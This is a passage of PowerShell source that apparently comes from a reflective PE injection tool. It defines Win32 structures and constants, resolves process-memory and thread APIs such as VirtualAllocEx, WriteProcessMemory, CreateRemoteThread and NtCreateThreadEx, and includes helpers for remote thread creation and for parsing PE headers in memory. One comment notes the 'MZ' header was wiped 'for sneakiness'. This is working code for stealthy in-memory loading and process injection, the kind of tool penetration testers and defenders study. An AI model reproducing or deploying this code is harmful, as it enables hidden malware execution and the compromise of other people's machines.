        $TypeBuilder = $ModuleBuilder.DefineType('LUID_AND_ATTRIBUTES', $Attributes, [System.ValueType], 12)
        $TypeBuilder.DefineField('Luid', $LUID, 'Public') | Out-Null
        $TypeBuilder.DefineField('Attributes', [UInt32], 'Public') | Out-Null
        $LUID_AND_ATTRIBUTES = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name LUID_AND_ATTRIBUTES -Value $LUID_AND_ATTRIBUTES
        
        #Struct TOKEN_PRIVILEGES
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('TOKEN_PRIVILEGES', $Attributes, [System.ValueType], 16)
        $TypeBuilder.DefineField('PrivilegeCount', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('Privileges', $LUID_AND_ATTRIBUTES, 'Public') | Out-Null
        $TOKEN_PRIVILEGES = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name TOKEN_PRIVILEGES -Value $TOKEN_PRIVILEGES

        return $Win32Types
    }

    Function Get-Win32Constants
    {
        $Win32Constants = New-Object System.Object
        
        $Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_COMMIT -Value 0x00001000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_RESERVE -Value 0x00002000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_NOACCESS -Value 0x01
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_READONLY -Value 0x02
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_READWRITE -Value 0x04
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_WRITECOPY -Value 0x08
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE -Value 0x10
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_READ -Value 0x20
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_READWRITE -Value 0x40
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_WRITECOPY -Value 0x80
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_NOCACHE -Value 0x200
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_ABSOLUTE -Value 0
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_HIGHLOW -Value 3
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_DIR64 -Value 10
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_DISCARDABLE -Value 0x02000000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_EXECUTE -Value 0x20000000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_READ -Value 0x40000000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_WRITE -Value 0x80000000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_NOT_CACHED -Value 0x04000000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_DECOMMIT -Value 0x4000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_EXECUTABLE_IMAGE -Value 0x0002
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_DLL -Value 0x2000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE -Value 0x40
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_DLLCHARACTERISTICS_NX_COMPAT -Value 0x100
        $Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_RELEASE -Value 0x8000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name TOKEN_QUERY -Value 0x0008
        $Win32Constants | Add-Member -MemberType NoteProperty -Name TOKEN_ADJUST_PRIVILEGES -Value 0x0020
        $Win32Constants | Add-Member -MemberType NoteProperty -Name SE_PRIVILEGE_ENABLED -Value 0x2
        $Win32Constants | Add-Member -MemberType NoteProperty -Name ERROR_NO_TOKEN -Value 0x3f0
        
        return $Win32Constants
    }

    Function Get-Win32Functions
    {
        $Win32Functions = New-Object System.Object
        
        $VirtualAllocAddr = Get-ProcAddress kernel32.dll VirtualAlloc
        $VirtualAllocDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
        $VirtualAlloc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocAddr, $VirtualAllocDelegate)
        $Win32Functions | Add-Member NoteProperty -Name VirtualAlloc -Value $VirtualAlloc
        
        $VirtualAllocExAddr = Get-ProcAddress kernel32.dll VirtualAllocEx
        $VirtualAllocExDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
        $VirtualAllocEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocExAddr, $VirtualAllocExDelegate)
        $Win32Functions | Add-Member NoteProperty -Name VirtualAllocEx -Value $VirtualAllocEx
        
        $memcpyAddr = Get-ProcAddress msvcrt.dll memcpy
        $memcpyDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr]) ([IntPtr])
        $memcpy = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($memcpyAddr, $memcpyDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name memcpy -Value $memcpy
        
        $memsetAddr = Get-ProcAddress msvcrt.dll memset
        $memsetDelegate = Get-DelegateType @([IntPtr], [Int32], [IntPtr]) ([IntPtr])
        $memset = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($memsetAddr, $memsetDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name memset -Value $memset
        
        $LoadLibraryAddr = Get-ProcAddress kernel32.dll LoadLibraryA
        $LoadLibraryDelegate = Get-DelegateType @([String]) ([IntPtr])
        $LoadLibrary = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LoadLibraryAddr, $LoadLibraryDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name LoadLibrary -Value $LoadLibrary
        
        $GetProcAddressAddr = Get-ProcAddress kernel32.dll GetProcAddress
        $GetProcAddressDelegate = Get-DelegateType @([IntPtr], [String]) ([IntPtr])
        $GetProcAddress = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetProcAddressAddr, $GetProcAddressDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name GetProcAddress -Value $GetProcAddress
        
        $GetProcAddressIntPtrAddr = Get-ProcAddress kernel32.dll GetProcAddress #This is still GetProcAddress, but instead of PowerShell converting the string to a pointer, you must do it yourself
        $GetProcAddressIntPtrDelegate = Get-DelegateType @([IntPtr], [IntPtr]) ([IntPtr])
        $GetProcAddressIntPtr = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetProcAddressIntPtrAddr, $GetProcAddressIntPtrDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name GetProcAddressIntPtr -Value $GetProcAddressIntPtr
        
        $VirtualFreeAddr = Get-ProcAddress kernel32.dll VirtualFree
        $VirtualFreeDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32]) ([Bool])
        $VirtualFree = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualFreeAddr, $VirtualFreeDelegate)
        $Win32Functions | Add-Member NoteProperty -Name VirtualFree -Value $VirtualFree
        
        $VirtualFreeExAddr = Get-ProcAddress kernel32.dll VirtualFreeEx
        $VirtualFreeExDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [UInt32]) ([Bool])
        $VirtualFreeEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualFreeExAddr, $VirtualFreeExDelegate)
        $Win32Functions | Add-Member NoteProperty -Name VirtualFreeEx -Value $VirtualFreeEx
        
        $VirtualProtectAddr = Get-ProcAddress kernel32.dll VirtualProtect
        $VirtualProtectDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool])
        $VirtualProtect = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualProtectAddr, $VirtualProtectDelegate)
        $Win32Functions | Add-Member NoteProperty -Name VirtualProtect -Value $VirtualProtect
        
        $GetModuleHandleAddr = Get-ProcAddress kernel32.dll GetModuleHandleA
        $GetModuleHandleDelegate = Get-DelegateType @([String]) ([IntPtr])
        $GetModuleHandle = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetModuleHandleAddr, $GetModuleHandleDelegate)
        $Win32Functions | Add-Member NoteProperty -Name GetModuleHandle -Value $GetModuleHandle
        
        $FreeLibraryAddr = Get-ProcAddress kernel32.dll FreeLibrary
        $FreeLibraryDelegate = Get-DelegateType @([Bool]) ([IntPtr])
        $FreeLibrary = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($FreeLibraryAddr, $FreeLibraryDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name FreeLibrary -Value $FreeLibrary
        
        $OpenProcessAddr = Get-ProcAddress kernel32.dll OpenProcess
        $OpenProcessDelegate = Get-DelegateType @([UInt32], [Bool], [UInt32]) ([IntPtr])
        $OpenProcess = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenProcessAddr, $OpenProcessDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name OpenProcess -Value $OpenProcess
        
        $WaitForSingleObjectAddr = Get-ProcAddress kernel32.dll WaitForSingleObject
        $WaitForSingleObjectDelegate = Get-DelegateType @([IntPtr], [UInt32]) ([UInt32])
        $WaitForSingleObject = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WaitForSingleObjectAddr, $WaitForSingleObjectDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name WaitForSingleObject -Value $WaitForSingleObject
        
        $WriteProcessMemoryAddr = Get-ProcAddress kernel32.dll WriteProcessMemory
        $WriteProcessMemoryDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
        $WriteProcessMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WriteProcessMemoryAddr, $WriteProcessMemoryDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name WriteProcessMemory -Value $WriteProcessMemory
        
        $ReadProcessMemoryAddr = Get-ProcAddress kernel32.dll ReadProcessMemory
        $ReadProcessMemoryDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
        $ReadProcessMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ReadProcessMemoryAddr, $ReadProcessMemoryDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name ReadProcessMemory -Value $ReadProcessMemory
        
        $CreateRemoteThreadAddr = Get-ProcAddress kernel32.dll CreateRemoteThread
        $CreateRemoteThreadDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])
        $CreateRemoteThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateRemoteThreadAddr, $CreateRemoteThreadDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name CreateRemoteThread -Value $CreateRemoteThread
        
        $GetExitCodeThreadAddr = Get-ProcAddress kernel32.dll GetExitCodeThread
        $GetExitCodeThreadDelegate = Get-DelegateType @([IntPtr], [Int32].MakeByRefType()) ([Bool])
        $GetExitCodeThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetExitCodeThreadAddr, $GetExitCodeThreadDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name GetExitCodeThread -Value $GetExitCodeThread
        
        $OpenThreadTokenAddr = Get-ProcAddress Advapi32.dll OpenThreadToken
        $OpenThreadTokenDelegate = Get-DelegateType @([IntPtr], [UInt32], [Bool], [IntPtr].MakeByRefType()) ([Bool])
        $OpenThreadToken = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenThreadTokenAddr, $OpenThreadTokenDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name OpenThreadToken -Value $OpenThreadToken
        
        $GetCurrentThreadAddr = Get-ProcAddress kernel32.dll GetCurrentThread
        $GetCurrentThreadDelegate = Get-DelegateType @() ([IntPtr])
        $GetCurrentThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetCurrentThreadAddr, $GetCurrentThreadDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name GetCurrentThread -Value $GetCurrentThread
        
        $AdjustTokenPrivilegesAddr = Get-ProcAddress Advapi32.dll AdjustTokenPrivileges
        $AdjustTokenPrivilegesDelegate = Get-DelegateType @([IntPtr], [Bool], [IntPtr], [UInt32], [IntPtr], [IntPtr]) ([Bool])
        $AdjustTokenPrivileges = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($AdjustTokenPrivilegesAddr, $AdjustTokenPrivilegesDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name AdjustTokenPrivileges -Value $AdjustTokenPrivileges
        
        $LookupPrivilegeValueAddr = Get-ProcAddress Advapi32.dll LookupPrivilegeValueA
        $LookupPrivilegeValueDelegate = Get-DelegateType @([String], [String], [IntPtr]) ([Bool])
        $LookupPrivilegeValue = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LookupPrivilegeValueAddr, $LookupPrivilegeValueDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name LookupPrivilegeValue -Value $LookupPrivilegeValue
        
        $ImpersonateSelfAddr = Get-ProcAddress Advapi32.dll ImpersonateSelf
        $ImpersonateSelfDelegate = Get-DelegateType @([Int32]) ([Bool])
        $ImpersonateSelf = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ImpersonateSelfAddr, $ImpersonateSelfDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name ImpersonateSelf -Value $ImpersonateSelf
        
        $NtCreateThreadExAddr = Get-ProcAddress NtDll.dll NtCreateThreadEx
        $NtCreateThreadExDelegate = Get-DelegateType @([IntPtr].MakeByRefType(), [UInt32], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [Bool], [UInt32], [UInt32], [UInt32], [IntPtr]) ([UInt32])
        $NtCreateThreadEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($NtCreateThreadExAddr, $NtCreateThreadExDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name NtCreateThreadEx -Value $NtCreateThreadEx
        
        $IsWow64ProcessAddr = Get-ProcAddress Kernel32.dll IsWow64Process
        $IsWow64ProcessDelegate = Get-DelegateType @([IntPtr], [Bool].MakeByRefType()) ([Bool])
        $IsWow64Process = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($IsWow64ProcessAddr, $IsWow64ProcessDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name IsWow64Process -Value $IsWow64Process
        
        $CreateThreadAddr = Get-ProcAddress Kernel32.dll CreateThread
        $CreateThreadDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [IntPtr], [UInt32], [UInt32].MakeByRefType()) ([IntPtr])
        $CreateThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateThreadAddr, $CreateThreadDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name CreateThread -Value $CreateThread
        
        return $Win32Functions
    }
    #####################################

            
    #####################################
    ###########    HELPERS   ############
    #####################################

    #Powershell only does signed arithmetic, so if we want to calculate memory addresses we have to use this function
    #This will add signed integers as if they were unsigned integers so we can accurately calculate memory addresses
    Function Sub-SignedIntAsUnsigned
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [Int64]
        $Value1,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [Int64]
        $Value2
        )
        
        [Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)
        [Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)
        [Byte[]]$FinalBytes = [BitConverter]::GetBytes([UInt64]0)

        if ($Value1Bytes.Count -eq $Value2Bytes.Count)
        {
            $CarryOver = 0
            for ($i = 0; $i -lt $Value1Bytes.Count; $i++)
            {
                $Val = $Value1Bytes[$i] - $CarryOver
                #Sub bytes
                if ($Val -lt $Value2Bytes[$i])
                {
                    $Val += 256
                    $CarryOver = 1
                }
                else
                {
                    $CarryOver = 0
                }
                
                
                [UInt16]$Sum = $Val - $Value2Bytes[$i]

                $FinalBytes[$i] = $Sum -band 0x00FF
            }
        }
        else
        {
            Throw "Cannot subtract bytearrays of different sizes"
        }
        
        return [BitConverter]::ToInt64($FinalBytes, 0)
    }
    

    Function Add-SignedIntAsUnsigned
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [Int64]
        $Value1,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [Int64]
        $Value2
        )
        
        [Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)
        [Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)
        [Byte[]]$FinalBytes = [BitConverter]::GetBytes([UInt64]0)

        if ($Value1Bytes.Count -eq $Value2Bytes.Count)
        {
            $CarryOver = 0
            for ($i = 0; $i -lt $Value1Bytes.Count; $i++)
            {
                #Add bytes
                [UInt16]$Sum = $Value1Bytes[$i] + $Value2Bytes[$i] + $CarryOver

                $FinalBytes[$i] = $Sum -band 0x00FF
                
                if (($Sum -band 0xFF00) -eq 0x100)
                {
                    $CarryOver = 1
                }
                else
                {
                    $CarryOver = 0
                }
            }
        }
        else
        {
            Throw "Cannot add bytearrays of different sizes"
        }
        
        return [BitConverter]::ToInt64($FinalBytes, 0)
    }
    

    Function Compare-Val1GreaterThanVal2AsUInt
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [Int64]
        $Value1,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [Int64]
        $Value2
        )
        
        [Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)
        [Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)

        if ($Value1Bytes.Count -eq $Value2Bytes.Count)
        {
            for ($i = $Value1Bytes.Count-1; $i -ge 0; $i--)
            {
                if ($Value1Bytes[$i] -gt $Value2Bytes[$i])
                {
                    return $true
                }
                elseif ($Value1Bytes[$i] -lt $Value2Bytes[$i])
                {
                    return $false
                }
            }
        }
        else
        {
            Throw "Cannot compare byte arrays of different size"
        }
        
        return $false
    }
    

    Function Convert-UIntToInt
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [UInt64]
        $Value
        )
        
        [Byte[]]$ValueBytes = [BitConverter]::GetBytes($Value)
        return ([BitConverter]::ToInt64($ValueBytes, 0))
    }


    Function Get-Hex
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        $Value #We will determine the type dynamically
        )

        $ValueSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Value.GetType()) * 2
        $Hex = "0x{0:X$($ValueSize)}" -f [Int64]$Value #Passing a IntPtr to this doesn't work well. Cast to Int64 first.

        return $Hex
    }
    
    
    Function Test-MemoryRangeValid
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [String]
        $DebugString,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $PEInfo,
        
        [Parameter(Position = 2, Mandatory = $true)]
        [IntPtr]
        $StartAddress,
        
        [Parameter(ParameterSetName = "EndAddress", Position = 3, Mandatory = $true)]
        [IntPtr]
        $EndAddress,
        
        [Parameter(ParameterSetName = "Size", Position = 3, Mandatory = $true)]
        [IntPtr]
        $Size
        )
        
        [IntPtr]$FinalEndAddress = [IntPtr]::Zero
        if ($PsCmdlet.ParameterSetName -eq "Size")
        {
            [IntPtr]$FinalEndAddress = [IntPtr](Add-SignedIntAsUnsigned ($StartAddress) ($Size))
        }
        else
        {
            $FinalEndAddress = $EndAddress
        }
        
        $PEEndAddress = $PEInfo.EndAddress
        
        if ((Compare-Val1GreaterThanVal2AsUInt ($PEInfo.PEHandle) ($StartAddress)) -eq $true)
        {
            Throw "Trying to write to memory smaller than allocated address range. $DebugString"
        }
        if ((Compare-Val1GreaterThanVal2AsUInt ($FinalEndAddress) ($PEEndAddress)) -eq $true)
        {
            Throw "Trying to write to memory greater than allocated address range. $DebugString"
        }
    }
    
    
    Function Write-BytesToMemory
    {
        Param(
            [Parameter(Position=0, Mandatory = $true)]
            [Byte[]]
            $Bytes,
            
            [Parameter(Position=1, Mandatory = $true)]
            [IntPtr]
            $MemoryAddress
        )
    
        for ($Offset = 0; $Offset -lt $Bytes.Length; $Offset++)
        {
            [System.Runtime.InteropServices.Marshal]::WriteByte($MemoryAddress, $Offset, $Bytes[$Offset])
        }
    }
    

    #Function written by Matt Graeber, Twitter: @mattifestation, Blog: http://www.exploit-monday.com/
    Function Get-DelegateType
    {
        Param
        (
            [OutputType([Type])]
            
            [Parameter( Position = 0)]
            [Type[]]
            $Parameters = (New-Object Type[](0)),
            
            [Parameter( Position = 1 )]
            [Type]
            $ReturnType = [Void]
        )

        $Domain = [AppDomain]::CurrentDomain
        $DynAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
        $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
        $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)
        $TypeBuilder = $ModuleBuilder.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
        $ConstructorBuilder = $TypeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $Parameters)
        $ConstructorBuilder.SetImplementationFlags('Runtime, Managed')
        $MethodBuilder = $TypeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $Parameters)
        $MethodBuilder.SetImplementationFlags('Runtime, Managed')
        
        Write-Output $TypeBuilder.CreateType()
    }


    #Function written by Matt Graeber, Twitter: @mattifestation, Blog: http://www.exploit-monday.com/
    Function Get-ProcAddress
    {
        Param
        (
            [OutputType([IntPtr])]
        
            [Parameter( Position = 0, Mandatory = $True )]
            [String]
            $Module,
            
            [Parameter( Position = 1, Mandatory = $True )]
            [String]
            $Procedure
        )

        # Get a reference to System.dll in the GAC
        $SystemAssembly = [AppDomain]::CurrentDomain.GetAssemblies() |
            Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }
        $UnsafeNativeMethods = $SystemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods')
        # Get a reference to the GetModuleHandle and GetProcAddress methods
        $GetModuleHandle = $UnsafeNativeMethods.GetMethod('GetModuleHandle')
        $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress')
        # Get a handle to the module specified
        $Kern32Handle = $GetModuleHandle.Invoke($null, @($Module))
        $tmpPtr = New-Object IntPtr
        $HandleRef = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $Kern32Handle)

        # Return the address of the function
        Write-Output $GetProcAddress.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$HandleRef, $Procedure))
    }
    
    
    Function Create-RemoteThread
    {
        Param(
        [Parameter(Position = 1, Mandatory = $true)]
        [IntPtr]
        $ProcessHandle,
        
        [Parameter(Position = 2, Mandatory = $true)]
        [IntPtr]
        $StartAddress,
        
        [Parameter(Position = 3, Mandatory = $false)]
        [IntPtr]
        $ArgumentPtr = [IntPtr]::Zero,
        
        [Parameter(Position = 4, Mandatory = $true)]
        [System.Object]
        $Win32Functions
        )
        
        [IntPtr]$RemoteThreadHandle = [IntPtr]::Zero
        
        $OSVersion = [Environment]::OSVersion.Version
        #Vista and Win7
        if (($OSVersion -ge (New-Object 'Version' 6,0)) -and ($OSVersion -lt (New-Object 'Version' 6,2)))
        {
            #Write-Verbose "Windows Vista/7 detected, using NtCreateThreadEx. Address of thread: $StartAddress"
            $RetVal= $Win32Functions.NtCreateThreadEx.Invoke([Ref]$RemoteThreadHandle, 0x1FFFFF, [IntPtr]::Zero, $ProcessHandle, $StartAddress, $ArgumentPtr, $false, 0, 0xffff, 0xffff, [IntPtr]::Zero)
            $LastError = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
            if ($RemoteThreadHandle -eq [IntPtr]::Zero)
            {
                Throw "Error in NtCreateThreadEx. Return value: $RetVal. LastError: $LastError"
            }
        }
        #XP/Win8
        else
        {
            #Write-Verbose "Windows XP/8 detected, using CreateRemoteThread. Address of thread: $StartAddress"
            $RemoteThreadHandle = $Win32Functions.CreateRemoteThread.Invoke($ProcessHandle, [IntPtr]::Zero, [UIntPtr][UInt64]0xFFFF, $StartAddress, $ArgumentPtr, 0, [IntPtr]::Zero)
        }
        
        if ($RemoteThreadHandle -eq [IntPtr]::Zero)
        {
            Write-Error "Error creating remote thread, thread handle is null" -ErrorAction Stop
        }
        
        return $RemoteThreadHandle
    }

    

    Function Get-ImageNtHeaders
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [IntPtr]
        $PEHandle,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $Win32Types
        )
        
        $NtHeadersInfo = New-Object System.Object
        
        #Normally would validate DOSHeader here, but we did it before this function was called and then destroyed 'MZ' for sneakiness
        $dosHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($PEHandle, [Type]$Win32Types.IMAGE_DOS_HEADER)

        #Get IMAGE_NT_HEADERS
        [IntPtr]$NtHeadersPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEHandle) ([Int64][UInt64]$dosHeader.e_lfanew))
        $NtHeadersInfo | Add-Member -MemberType NoteProperty -Name NtHeadersPtr -Value $NtHeadersPtr
        $imageNtHeaders64 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($NtHeadersPtr, [Type]$Win32Types.IMAGE_NT_HEADERS64)
        
        #Make sure the IMAGE_NT_HEADERS checks out. If it doesn't, the data structure is invalid. This should never happen.
        if ($imageNtHeaders64.Signature -ne 0x00004550)
        {
            throw "Invalid IMAGE_NT_HEADER signature."
        }
        
        if ($imageNtHeaders64.OptionalHeader.Magic -eq 'IMAGE_NT_OPTIONAL_HDR64_MAGIC')
        {
            $NtHeadersInfo | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value $imageNtHeaders64
            $NtHeadersInfo | Add-Member -MemberType NoteProperty -Name PE64Bit -Value $true
        }
        else
        {
            $ImageNtHeaders32 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($NtHeadersPtr, [Type]$Win32Types.IMAGE_NT_HEADERS32)
            $NtHeadersInfo | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value $imageNtHeaders32
            $NtHeadersInfo | Add-Member -MemberType NoteProperty -Name PE64Bit -Value $false
        }
        
        return $NtHeadersInfo
    }


    #This function will get the information needed to allocated space in memory for the PE
    Function Get-PEBasicInfo
    {
        Param(
        [Parameter( Position = 0, Mandatory = $true )]
        [Byte[]]
        $PEBytes,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $Win32Types
        )
        
        $PEInfo = New-Object System.Object
        
        #Write the PE to memory temporarily so I can get information from it. This is not it's final resting spot.
        [IntPtr]$UnmanagedPEBytes = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PEBytes.Length)
        [System.Runtime.InteropServices.Marshal]::Copy($PEBytes, 0, $UnmanagedPEBytes, $PEBytes.Length) | Out-Null
        
        #Get NtHeadersInfo
        $NtHeadersInfo = Get-ImageNtHeaders -PEHandle $UnmanagedPEBytes -Win32Types $Win32Types
        
        #Build a structure with the information which will be needed for allocating memory and writing the PE to memory
        $PEInfo | Add-Member -MemberType NoteProperty -Name 'PE64Bit' -Value ($NtHeadersInfo.PE64Bit)
        $PEInfo | Add-Member -MemberType NoteProperty -Name 'OriginalImageBase' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.ImageBase)
        $PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfImage' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage)
        $PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfHeaders' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.SizeOfHeaders)
        $PEInfo | Add-Member -MemberType NoteProperty -Name 'DllCharacteristics' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.DllCharacteristics)
        
        #Free the memory allocated above, this isn't where we allocate the PE to memory
        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($UnmanagedPEBytes)
        
        return $PEInfo
    }


    #PEInfo must contain the following NoteProperties:
    #   PEHandle: An IntPtr to the address the PE is loaded to in memory
    Function Get-PEDetailedInfo
    {
        Param(
        [Parameter( Position = 0, Mandatory = $true)]
        [IntPtr]
        $PEHandle,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $Win32Types,
        
        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
        $Win32Constants
        )
        
        if ($PEHandle -eq $null -or $PEHandle -eq [IntPtr]::Zero)
        {
            throw 'PEHandle is null or IntPtr.Zero'
        }
        
        $PEInfo = New-Object System.Object
        
        #Get NtHeaders information
